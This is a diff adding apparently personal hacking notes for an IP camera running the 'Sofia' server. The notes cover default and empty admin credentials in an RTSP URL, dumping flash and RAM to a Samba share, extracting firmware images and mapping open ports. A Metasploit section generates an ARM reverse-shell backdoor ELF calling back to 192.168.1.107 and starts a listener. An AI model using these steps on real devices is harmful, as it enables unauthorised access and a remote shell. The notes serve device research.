@@ -1,0 +1,69 @@
+# Default passwords, guest account left on
+
+rtsp://192.168.1.108:554//user=admin_password=_channel=1_stream=0.sdp
+
+# System info.... cd around /proc/cpuinfo, /proc/stat, bins
+
+# Mount Samba (CIFS) share:
+mount -t cifs -o username=GUEST,password=p //192.168.1.107/smb /mnt/samba
+
+# Dump flash
+dd if=/dev/mtdblock0 of=/mnt/samba/mtdblock0 bs=4096
+
+# Dump Memory
+dd if=/dev/mem of=/mnt/samba/ram bs=4096
+# We get a segfault, but we got some handy info
+
+# binwalk flashdump
+# extract flashdump (cramfs, jffs2)
+apt-get install cramfsprogs, mtd-utils
+
+jffs2reader mtdblock7 # -d: directory, -f: cat out file
+jffs2dump mtdblock7
+
+# mount jffs2 image
+modprobe mtdram total_size=65536 # also erase_size=128
+modprobe mtdblock
+modprobe jffs2
+dd if=mtdblock7 of=/dev/mtdblock0
+mount /dev/mtdblock0 /mountpoint -t jffs2
+
+# U-Boot bootargs:
+strings mtdblock1
+# bootargs = Linux Kernel Boot Arguments
+#
+
+# Web Server fun
+# check open ports
+netstat -l
+# netstat does not have the option -e, we use instead:
+cat /proc/net/tcp | grep :0050 # 0050 is port 80 in hex
+# get inode info: 3896
+# Check process for inode 3896
+ls -l /proc/939/fd | grep 3896 # Sofia
+
+# Map Open ports to processes
+# ========= TCP ================
+# 23 - telnetd # Telnet Server
+# 80 - Sofia # HTTP Server
+# 554 - Sofia # RTSP Stream
+# 8899 - Sofia # SOAP (ONVIF?)
+# 9527 -                  (???)
+# 34561 -
+# 34567 - Sofia # ONVIF (Media Port?)
+# 34599 - Sofia #
+# ========= UDP ================
+
+# Metasploit Fun
+msfconsole
+use linux/armle/shell_reverse_tcp
+set LHOST 192.168.1.107
+set SHELL /bin/sh
+generate -f backdoor -t elf
+use exploit/multi/handler
+set PAYLOAD linux/armle/shell_reverse_tcp
+set LPORT 4444
+exploit # :)
+
+# Video fun
+/usr/sbin/fvideoencoder -i 2 -s 10 -d 0 -o 1 -h 2 -g 2 -l 0 -t 2 -j 1 -f 1 -x 1 -a 3 -b 40
